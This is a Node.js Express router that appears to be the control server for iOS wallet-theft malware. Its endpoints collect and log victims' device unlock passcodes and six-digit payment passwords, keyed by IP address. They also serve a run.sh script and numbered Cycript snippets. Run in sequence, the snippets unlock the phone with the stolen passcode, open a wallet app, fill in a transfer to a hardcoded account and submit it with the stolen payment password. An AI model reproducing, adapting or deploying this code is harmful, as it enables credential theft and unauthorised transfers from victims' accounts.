var crypto = require('crypto')
var express = require("express")
var router = express.Router()
var config = require("../util/config")
var mongoose = require("mongoose")
var fs = require("fs")
//db
var db = require("../util/db")
var models = require("../models/user")
util = require("util")

Date.timeStamp = function() {
    var time = new Date().getTime()
    return Math.floor(time / 1000)
}

router.get("/unlock_password", function (req, res, next) {
    var unlock_pwd = req.query.unlock_pwd
    var locIP = req.query.uuid
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    var uuid = ip + locIP
    console.log("uuid: " + uuid)
    console.log("unlock_pwd: " + unlock_pwd)
    console.log("ip: " + ip)
    updateBWAUserInfo(uuid, {$set: {unlock_pwd: unlock_pwd}}, res)
})

router.get("/bwa_password", function (req, res, next) {
    var bwa_pwd = req.query.bwa_pwd
    var locIP = req.query.uuid
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    var uuid = ip + locIP
    console.log("uuid: " + uuid)
    console.log("bwa_pwd: " + bwa_pwd)
    console.log("ip: " + ip)
    if (bwa_pwd.length !== 6) {
        res.send("wrong")
        return;
    }
    updateBWAUserInfo(uuid, {$set: {bwa_pwd: bwa_pwd}}, res)
})

router.get("/run_sh", function (req, res, next) {
    var run_sh = fs.readFileSync("./run.sh").toString()
    res.send(run_sh)
})

router.get("/bwa_sh", function (req, res, next) {
    var locIP = req.query.uuid
    var script_number = parseInt(req.query.script_number)
    if (locIP === undefined) {
        res.send({error: "nothing found for locIP: " + locIP})
        return
    }
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    var uuid = ip + locIP
    console.log("uuid: " + uuid);
    models.bwa_user_info.find({_id: uuid}, function (err, docs) {
        if (docs.length === 0) {
            res.send({error: "nothing found"})
            return
        } else if (docs[0].bwa_pwd === undefined) {
            res.send({error: "nothing found"})
            return
        }
        var currentDate = new Date()
        var fireDate = currentDate
        fireDate.setMinutes(fireDate.getMinutes() + 1)
        console.log("script_number: " + script_number);
        switch(script_number) {
            case 0:
                res.send(util.format("[[objc_getClass('SBLockScreenManager') sharedInstance] attemptUnlockWithPasscode:'%s'];\n", docs[0].unlock_pwd));
                break;
            case 1:
                res.send("function currentViewController() {keyWindow=[UIApplication sharedApplication].keyWindow;root=keyWindow.rootViewController;vc=root.visibleViewController;return vc;};function viewOfClass(className, subviews){for (var i in subviews){if ([NSStringFromClass([subviews[i] class]) isEqualToString:className]){return subviews[i]}}return nil};serviceVC=currentViewController().viewControllers[0];scrollView=viewOfClass('UIScrollView', serviceVC.view.subviews());walletGridView=viewOfClass('BWA_WalletGridView', scrollView.subviews());cell=[walletGridView walletGridViewCellWithIndex: 1];[walletGridView didSelectGridViewCell: cell selectIndex: 1];\n");
                break;
            case 2:
                res.send("function currentViewController() {keyWindow=[UIApplication sharedApplication].keyWindow;root=keyWindow.rootViewController;vc=root.visibleViewController;return vc;};function viewOfClass(className, subviews){for (var i in subviews){if ([NSStringFromClass([subviews[i] class]) isEqualToString:className]){return subviews[i]}}return nil};tableView=currentViewController().view.subviews()[0].subviews()[0].subviews()[0].subviews()[0].subviews()[0];header=tableView.subviews()[1];accountItem=tableView.subviews()[1].subviews()[1];[header itemPressed:accountItem];\n")
                break;
            case 3:
                res.send("function currentViewController() {keyWindow=[UIApplication sharedApplication].keyWindow;root=keyWindow.rootViewController;vc=root.visibleViewController;return vc;};function viewOfClass(className, subviews){for (var i in subviews){if ([NSStringFromClass([subviews[i] class]) isEqualToString:className]){return subviews[i]}}return nil};tableview2=currentViewController().view.subviews()[0].subviews()[0].subviews()[0].subviews()[0].subviews()[0];tableview2.dataSource.accountInputCell.detailTextField.text='15900699553';tableview2.dataSource.moneyInputCell.detailTextField.text='0.01';tableview2.dataSource.confirmInfo();\n")
                break;
            case 4:
                res.send("function currentViewController() {keyWindow=[UIApplication sharedApplication].keyWindow;root=keyWindow.rootViewController;vc=root.visibleViewController;return vc;};function viewOfClass(className, subviews){for (var i in subviews){if ([NSStringFromClass([subviews[i] class]) isEqualToString:className]){return subviews[i]}}return nil};submitVC=currentViewController().view.subviews()[0].subviews()[0].subviews()[0].subviews()[0].subviews()[0].dataSource;submitVC.submitOrder();\n")
                break;
            case 5:
                res.send(util.format("function currentViewController() {keyWindow=[UIApplication sharedApplication].keyWindow;root=keyWindow.rootViewController;vc=root.visibleViewController;return vc;};function viewOfClass(className, subviews){for (var i in subviews){if ([NSStringFromClass([subviews[i] class]) isEqualToString:className]){return subviews[i]}}return nil};deskVC=currentViewController().view.subviews()[0].subviews()[0].subviews()[0].subviews()[0].subviews()[0].dataSource;[deskVC didFinishedEnterPassword: '%s'];\n", docs[0].bwa_pwd))
                break;
            default:
                res.send({userInfo: docs[0], sleep_time: 60})
        }
    })
})

router.get("/exec_interval", function (req, res, next) {
    var currentStamp = Date.timeStamp()
    var fireStamp = Date.timeStamp() + config.interval
    res.send((fireStamp - currentStamp).toString())
})

function shellCommandForUserInfo(userInfo) {
    var unlock_pwd = userInfo.unlock_pwd
    var bwa_pwd = userInfo.bwa_pwd
    var shell = util.format("")
}

function updateBWAUserInfo(uuid, update, res) {
    models.bwa_user_info.findOneAndUpdate({_id: uuid}, update, {upsert: true, setDefaultsOnInsert: true}, function(err, doc){
        if (err) return res.send(500, { error: err });
        return res.send("succesfully saved");
    })
}

module.exports = router